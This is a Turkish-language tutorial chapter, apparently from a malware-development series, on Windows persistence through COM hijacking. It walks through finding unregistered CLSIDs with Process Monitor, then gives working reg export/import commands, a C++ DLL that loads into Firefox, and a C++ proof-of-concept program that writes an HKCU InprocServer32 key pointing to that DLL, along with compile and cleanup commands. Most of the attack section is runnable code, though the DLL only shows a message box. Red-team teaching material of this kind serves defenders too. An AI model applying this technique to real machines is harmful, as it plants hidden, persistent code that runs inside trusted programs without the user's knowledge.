\newpage
\subsection{69. zararlı yazılım geliştirme: kalıcılık - bölüm 3. COM DLL Hijack. Basit C++ örneği}

![pers](./images/53/2022-05-02_17-02_1.png){width="80%"}    

Bu bölüm, Windows zararlı yazılım kalıcılık teknikleri ve hileleri üzerine yazı dizisinin bir sonraki bölümüdür.    

Bugün, kendi araştırmalarımın sonucu olan bir başka kalıcılık hilesi hakkında yazacağım: COM Hijacking.    

### Component Object Model

`Windows 3.11`'de Microsoft, **Component Object Model (COM)**'u tanıttı.
Bu, nesne yönelimli bir sistem olup, farklı ikili yazılım bileşenlerinin birbirleriyle etkileşime girmesine olanak tanır. COM, bir arayüz teknolojisidir ve iç yapısını bilmeden bileşenleri yeniden kullanmanıza izin verir.    

Bu yazıda, red team'lerin güvenilir bir sürecin adına nasıl rastgele kod çalıştırmak için COM nesnelerinikullanabileceğini göstereceğim.

Bir yazılım, bir COM nesnesini yüklemek istediğinde, Windows API’sindeki
`CoCreateInstance` işlevini kullanarak belirli bir sınıfın başlatılmamış bir nesne örneğini oluşturur. Bu işlemde CLSID (*class identifier*) parametrelerden biridir.    

Bir program, belirli bir `CLSID` değeri ile `CoCreateInstance` işlevini çağırdığında,
işletim sistemi registry'yi kontrol ederek hangi ikili dosyanın (binary) istenen `COM` kodunu içerdiğini belirler:     

![pers](./images/53/2022-05-02_17-41.png){width="80%"}    

`CLSID` anahtarı altındaki `InProcServer32` alt anahtarının içeriği, bir sonraki görselde gösterilmektedir:    

![pers](./images/53/2022-05-02_17-42.png){width="80%"}    

Benim durumumda, `firefox.exe`, `CoCreateInstance` işlevini aşağıdaki `CLSID` ile çağırıyor:   
`{A1DB7B5E-D0EA-4FE0-93C4-314505788272}`. `C:\Windows\System32\TaskFlowDataEngine.dll`
registry anahtarıyla ilişkili dosya `HKCU\Software\Classes\CLSID\{A1DB7B5E-D0EA-4FE0-93C4-314505788272}\InprocServer32`      

Kod çalıştırmanın çeşitli yolları vardır, ancak COM, red teaming senaryolarında kalıcılık (persistence), yanal hareket (lateral movement) ve savunmadan kaçınma (defense evasion) amacıyla kullanılmıştır. Zararlı kodun nasıl çalıştırıldığına bağlı olarak COM Hijacking sırasında çeşitli registry alt anahtarları kullanılır.Bunlar şunlardır:     

- InprocServer/InprocServer32    
- LocalServer/LocalServer32    
- TreatAs    
- ProgID    

Yukarıda listelenen alt anahtarlar, şu registry hives içinde bulunur:    

- `HKEY_CURRENT_USER\Software\Classes\CLSID`    
- `HKEY_LOCAL_MACHINE\Software\Classes\CLSID`    

### COM anahtarlarını ele geçirmek için nasıl keşfedilir

`COM` hijacking için kullanılabilecek COM anahtarlarını belirlemek oldukça basittir ve sadece Sysinternals [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kullanarak `CLSID` içermeyen `COM` sunucularını bulmayı gerektirir.Ayrıca, bu yöntem yükseltilmiş ayrıcalıklar (elevated privileges) gerektirmez çünkü `HKCU` (`HKEY_CURRENT_USER`) altında işlem yapılabilir. Process Monitor içinde aşağıdaki filtreler ayarlanabilir:

![pers](./images/53/2022-05-02_16-24.png){width="80%"}    

Ayrıca aşağıdaki filtresi eklemek de faydalıdır: *Eğer yol `HKLM` ile başlıyorsa hariç tut (Exclude if path starts with `HKLM`).*    

Windows, `COM` nesnelerini yüklemeye çalışırken öncelikle `HKEY_CURRENT_USER` (`HKCU`) anahtarını kontrol eder ve kullanıcı tarafından belirtilen `COM` nesnelerine sistem genelindeki `COM` nesnelerine kıyasla öncelik verir. (Ek bilgi için: `HKEY_CLASSES_ROOT` anahtarına bakılabilir.)     

Benim durumumda, `firefox.exe` süreci aşağıdaki görüntüde gösterildiği gibi bu davranışı sergiliyor. Süreç, `HKCU` registry anahtarı altında `CLSID A6FF50C0-56C0-71CA-5732-BED303A59628` değerine erişmeye çalışıyor.
Ancak `HKCU` altında `CLSID` bulunamadığından, Windows `HKLM` (arka planda `HCKR` olarak geçer) altında aynı `CLSID` için geri dönüyor ve önceki deneme başarılı oluyor.Bu, aşağıdaki komutlarla kontrol edilebilir:     

```powershell
reg query \
"HKCU\Software\Classes\CLSID\
{A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32" /s
reg query "HKCR\CLSID\
{A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32" /s
```

![pers](./images/53/2022-05-02_16-25_1.png){width="80%"}    

Yukarıda belirtilen adımları takip ettikten sonra, artık *COM Hijacking saldırısı* (*COM Hijacking attack*) başlatmak için kullanabileceğimiz kritik bilgilere sahibiz.

### saldırı süreci

İlk olarak, yerel bilgisayarın belirli alt anahtarlarını (subkeys), girişlerini (entries) ve değerlerini (values) bir dosyaya dışa aktarın (export):     

```powershell
reg export \
"HKCR\CLSID\{A6FF50C0-56C0-71CA-5732-BED303A59628}
\InprocServer32" \
C:\...\2022-05-02-malware-pers-3\orig.reg /reg:64 /y
```

![pers](./images/53/2022-05-02_16-31.png){width="80%"}    

Sonraki adım, bu dosyayı düzenleyerek `HKCU\Software\Classes\CLSID{A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32` kayıt defteri anahtarının varsayılan değerini ayarlamaktır:     

![pers](./images/53/2022-05-02_16-37.png){width="80%"}    

Gördüğünüz gibi, yürütülecek özel bir DLL yerleştiriyoruz:    

![pers](./images/53/2022-05-02_16-39.png){width="80%"}    

Basitlik adına, her zamanki gibi [önceki](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html) gönderilerimden birindeki aynı dosyayı kullandım.    

Kaynak koddan derleyebilirsiniz (`evil.cpp`):     

```cpp
/*
evil.cpp
simple DLL for DLL inject to process
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/09/20/malware-injection-2.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, 
DWORD nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow from evil.dll!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

Ardından, sadece çalıştırın:    

```bash
x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive
```

![pers](./images/53/2022-05-02_17-04.png){width="80%"}    

Reg dosyasını `evil.reg` olarak kaydedin:    

![pers](./images/53/2022-05-02_18-22.png){width="80%"}    

Ve içe aktarın, ardından kayıt defterini tekrar kontrol edin:    

```powershell
reg import \
C:\...\2022-05-02-malware-pers-3\evil.reg /reg:64
reg query \
"HKCU\Software\Classes\CLSID\
{A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32" \
/s
```

![pers](./images/53/2022-05-02_16-43.png){width="80%"}    

Mükemmel!    

### demo

Ardından, benim durumumda `firefox.exe`'yi yeniden başlatın ve bir süre bekleyin. Yaklaşık `7` dakika bekledim:     

![pers](./images/53/2022-05-02_16-52.png){width="80%"}    

![pers](./images/53/2022-05-02_16-54.png){width="80%"}    

Eğer fark ederseniz, `PID 9272` olarak görünüyor. Ancak `Process Hacker`'ı açarsanız, burada olmadığını görebilirsiniz.     

![pers](./images/53/2022-05-02_17-02.png){width="80%"}    

Firefox bir süre sonra çöktü.     

![pers](./images/53/2022-05-02_16-59.png){width="80%"}    

Ancak bu yalnızca bir kez oldu.     

Daha sonra, "meow-meow" mesaj kutusu belirli aralıklarla açılmaya başladı:   

![pers](./images/53/2022-05-02_16-54_1.png){width="80%"}    

Ve hatta `firefox`'u kapattıktan sonra bile devam etti:     

![pers](./images/53/2022-05-02_17-06.png){width="80%"}    

Bu harika! :)

### güncelleme: programcı yolu

Ayrıca, `pers.cpp` adında bir basit Proof of Concept (PoC) betiği oluşturdum:    

```cpp
/*
pers.cpp
windows low level persistence via 
COM hijacking
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/02/malware-pers-3.html
*/
#include <windows.h>
#include <string.h>
#include <cstdio>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // subkey
  const char* sk = 
  "Software\\Classes\\CLSID\\
  {A6FF50C0-56C0-71CA-5732-BED303A59628}\\InprocServer32";

  // malicious DLL
  const char* dll = 
  "C:\\Users\\User\\Desktop\\shared\\
  2022-05-02-malware-pers-3\\evil.dll";

  // startup
  LONG res = RegCreateKeyEx(HKEY_CURRENT_USER, 
  (LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE, 
  KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {
    // create new registry keys
    RegSetValueEx(hkey, NULL, 0, REG_SZ, 
    (unsigned char*)dll, strlen(dll));
    RegCloseKey(hkey);
  } else {
    printf("cannot create subkey for hijacking :(\n");
    return -1;
  }
  return 0;
}
```

Şunu çalıştıralım:    

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/53/2022-05-02_18-59.png){width="80%"}    

ve çalıştıralım:    

```powershell
.\pers.exe
```

![pers](./images/53/2022-05-02_19-45.png){width="80%"}    

Gördüğünüz gibi, her şey mükemmel çalışıyor :)    

Deneyler tamamlandıktan sonra temizleme işlemi:    

```powershell
reg delete \
"HKCU\Software\Classes\CLSID\
{A6FF50C0-56C0-71CA-5732-BED303A59628}" \
/f
```

![pers](./images/53/2022-05-02_19-53.png){width="80%"}    

### sonuç

Bir saldırgan, bu işlemleri gerçekleştirdikten sonra sistemde sessiz kalıcılığı sağlamak için yaygın olarak kullanılan ancak pek bilinmeyen bir teknik kullanabilir. Gerçek dünyada, bu taktik genellikle [APT 28](https://attack.mitre.org/groups/G0007/), [Turla](https://attack.mitre.org/groups/G0010/), ve [Mosquito](https://attack.mitre.org/software/S0256/) backdoor gibi gruplar tarafından kullanılmıştır.    

[COM hijacking MITRE ATT&CK](https://attack.mitre.org/techniques/T1546/015/)    
[APT 28](https://attack.mitre.org/groups/G0007/)    
[Turla](https://attack.mitre.org/groups/G0010/)    
[RegCreateKeyEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa)    
[RegSetValueEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)    
[reg query](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)    
[reg import](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-import)    
[reg export](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-export)    
[reg delete](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-delete)    
[github'taki kaynak kod](https://github.com/cocomelonc/2022-05-02-malware-pers-3)    
